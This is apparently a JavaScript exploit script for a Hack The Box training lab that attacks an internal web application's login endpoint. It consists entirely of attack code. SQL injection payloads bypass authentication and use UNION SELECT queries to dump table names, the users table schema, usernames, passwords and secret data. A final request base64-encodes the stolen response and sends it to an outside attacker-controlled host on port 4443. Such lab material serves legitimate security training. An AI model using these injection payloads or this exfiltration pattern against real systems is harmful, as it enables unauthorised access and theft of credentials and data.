// identify sqli
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// exploit
// bypass authentication
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// dump tables
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// dump schema of users table
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// dump users table iteratively
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// final step for getting flag in "exploiting internal web applications 1" part
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,data FROM secretdata-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// exfil step
var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.191:4443/exfil?data=" + btoa(xhr.responseText), false);
exfil.send();